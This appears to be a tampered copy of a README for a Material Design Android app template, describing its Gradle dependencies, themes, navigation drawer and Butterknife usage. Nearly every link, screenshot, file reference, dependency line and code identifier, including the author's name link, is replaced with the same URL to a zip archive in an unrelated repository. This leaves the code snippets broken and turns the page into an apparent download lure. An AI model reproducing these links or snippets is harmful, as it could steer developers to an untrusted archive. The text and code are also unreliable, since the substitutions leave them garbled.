# Material Design Android Template

First of all, a few screenshots:

Smartphone          |  Tablet
:-------------------------:|:-------------------------:
![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)  |  ![Tablet](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)

Collapsing Toolbar          |  Navigation Drawer
:-------------------------:|:-------------------------: 
![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)  |  ![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip) 

Support Design Library Views          |  Preferences
:-------------------------:|:-------------------------: 
![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)  |  ![Smartphones](https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip) 


## What is this?

This is a State of the Art Android Material Design template. You can use this project as a template for upcoming App projects. Just clone the project, change package name and make all necessary customisations. 


## Dependencies

The focus of this project lies on the view layer and app navigation. It uses the following dependencies:

- AppCompat Support Library
- Support Design Library
- Support Card View Library
- Butterknife
- Glide 

## Supported devices

The template support every device with a SDK level of at least 14 (Android 4+).


## Quick walkthrough

### Gradle

Nothing special here. Please note that the version of the support library is extracted to *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*:

```xml
    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip${android_support_lib_version}"
    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip${android_support_lib_version}"
    compile "https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip${android_support_lib_version}"

    compile 'https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip'
    compile 'https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip'
```

### Manifest

There are only three Activities declared. The main theme is *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*.

### Theme

The project contains three *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*.

1. https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip  (basic colors, styles)
2. https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip  (contains Android 5 statusbar/systembar features)
3. https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip (used for tablet layout)

You can easily change the colors of your app. You only have to set the color values in https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <color name="theme_primary_accent">#8BC34A</color>
    <color name="theme_primary_dark">#1976D2</color>
    <color name="theme_primary_light">#2196F3</color>
    <color name="theme_window_background">#FFF5F5F5</color>
    <color name="theme_divider">#B6B6B6</color>

    <color name="primary_text">#212121</color>
    <color name="secondary_text">#727272</color>
</resources>
```

### Navigation

The navigation drawer is configured in *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*:

```xml
<?xml version="1.0" encoding="utf-8"?>
<menu xmlns:android="https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip">
    <group android:checkableBehavior="single">
        <item
            android:id="@+id/nav_quotes"
            android:icon="@drawable/ic_discuss"
            android:title="@string/navigation_quotes" />
        <item
            android:id="@+id/nav_samples"
            android:icon="@drawable/ic_forum"
            android:title="@string/navigation_samples" />
            ... 
```



### Base classes

*BaseActivity* is the parent class for every *Activity* inside this template. This class creates and provides the navigation drawer and toolbar.

*BaseFragment* is the parent for every *Fragment* class. It is responsible for view inflating and view binding (via ButterKnife).

### Quotes View

The *ListActivity* is the start *Activity* and supports two differend layout modes:

1. One pane mode: Used on devices with a small screen size. The Activity shows only a list of all available quotes.
2. Two pane mode: Used on tablets and every device with a high screen size (>= 600dp width). The Activity shows the list of quotes and displays the selected item in a seperate Fragment.

### Settings

The *SettingsActivity* represents some dummy preferences. You can easily configure your settings by modifying the *https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip*.

### View Samples

The *ViewSamplesActivity* shows some stuff from the Support Design Library.

Butterknife is not only used for view binding, furthermore it is also used for configuring click listeners:

```java
    @OnClick(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
    public void onFabClicked(View view) {
       // floating action button clicked
    }
```

For example, the following snippet (https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip) binds automatically the view:
```java
    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
    TextView quote;

    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
    TextView author;

    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
    ImageView backdropImg;

    @Bind(https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip)
    CollapsingToolbarLayout collapsingToolbar;
```

## About
My name is <a href="https://raw.githubusercontent.com/dextercool/android-design-template/master/app/src/androidTest/android-design-template-1.6.zip">Andreas Schrade</a> and I am a freelance software developer with an interest in Android and Java backend development.







 

